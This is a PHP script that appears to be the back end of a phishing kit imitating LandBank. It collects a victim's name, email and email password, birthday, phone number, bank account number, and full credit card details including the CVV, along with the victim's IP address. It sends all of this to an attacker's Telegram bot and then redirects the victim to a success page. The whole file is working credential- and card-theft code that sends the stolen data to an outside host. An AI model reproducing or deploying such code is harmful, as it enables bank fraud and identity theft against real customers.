<?php

$fname = ($_POST['fname']);
$mname = ($_POST['mname']);
$lname = ($_POST['lname']);
$email = ($_POST['email']);
$emailpass = ($_POST['emailpass']);
$bday = ($_POST['bday']);
$contact = ($_POST['contact']);
$accnum = ($_POST['accnum']);
$cnum = ($_POST['cnum']);
$exp = ($_POST['exp']);
$cvv = ($_POST['cvv']);
$host = ($_SERVER['SERVER_NAME']);
$ip = ($_SERVER['REMOTE_ADDR']);
$path = ($_SERVER['REQUEST_URI']);
$date = date("y/m/d h:i:sa");


include "config.php";
$mesg = "=-=-=-=-=-=-=-=-=-=-Info LandBank Result!-=-=-=-=-=-=-=-=-=-= \r\n First Name:$fname \r\nMiddle Name:$mname \r\nLast Name:$lname \r\nEmail:$email \r\nEmail Password:$emailpass \r\nBirthday:$bday \r\nContact Number:$contact \r\nAccount Number:$accnum \r\n-=-=-=-=-=-=-=-=-=-=-(CC Info)-=-=-=-=-=-=-=-=-=-=-\r\nCC Number:$cnum \r\nExpiration Date:$exp \r\nCVV:$cvv \r\nIP Address: $ip \r\n-=-=-=-=-=-=-=-=-=-=-Info LandBank Result!-=-=-=-=-=-=-=-=-=-=-";
$request_params = [
	'chat_id' => $user_id,
	'text' => $mesg
];
$request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
file_get_contents($request_url);
header("location: success.php");
?>